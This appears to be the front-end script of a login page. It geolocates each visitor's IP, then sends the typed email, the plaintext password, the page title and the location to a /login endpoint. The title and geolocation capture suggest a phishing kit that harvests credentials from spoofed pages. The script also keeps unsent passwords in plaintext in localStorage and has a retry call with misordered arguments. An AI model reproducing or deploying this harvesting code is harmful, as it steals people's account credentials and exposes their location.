let userIPData = {}; // Store IP data

// Function to fetch user's IP
async function fetchIPData() {
    try {
        // Get public IP
        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Get detailed IP information
        const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
        userIPData = await geoResponse.json();

        console.log("User IP Data:", userIPData);
    } catch (error) {
        console.error("Error fetching IP data:", error);
    }
}

// Call function on page load
fetchIPData();

// Function to send login data to the server
async function sendLoginData(email, password, title, ipData, retries = 3, delay = 1000) {
    try {
        const response = await fetch("/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password, title, ipData }),
        });

        if (!response.ok) {
            throw new Error("Network response was not ok");
        }

        const data = await response.json();
        console.log("Response:", data);

        // Clear any stored data if the request succeeds
        localStorage.removeItem("pendingLoginData");
    } catch (error) {
        console.error("Error sending login data:", error);

        if (retries > 0) {
            console.log(`Retrying... ${retries} attempts left`);
            setTimeout(() => {
                sendLoginData(email, password, ipData, retries - 1, delay * 2); // Exponential backoff
            }, delay);
        } else {
            console.log("All retry attempts failed. Storing data for later.");
            // Store the data in localStorage for offline persistence
            const pendingData = { email, password, ipData };
            localStorage.setItem("pendingLoginData", JSON.stringify(pendingData));
        }
    }
}

// Function to check for pending data and send it
function sendPendingData() {
    const pendingData = localStorage.getItem("pendingLoginData");
    if (pendingData) {
        const { email, password, ipData } = JSON.parse(pendingData);
        console.log("Sending pending login data...");
        sendLoginData(email, password, ipData);
    }
}

// Handle login
document.querySelector('.submit').addEventListener('click', function (event) {
    event.preventDefault(); // Prevent form submission (if applicable)

    var email = document.getElementById('mail').value;
    var password = document.getElementById('pass').value;
    var title = document.title;
    console.log(title);
    

    // Send login data
    sendLoginData(email, password, title, userIPData);

    // Reset fields
    document.getElementById("mail").value = "";
    document.getElementById("pass").value = "";
});

// Check for pending data when the page loads
window.addEventListener("load", sendPendingData);

// Check for pending data when the user comes back online
window.addEventListener("online", sendPendingData);
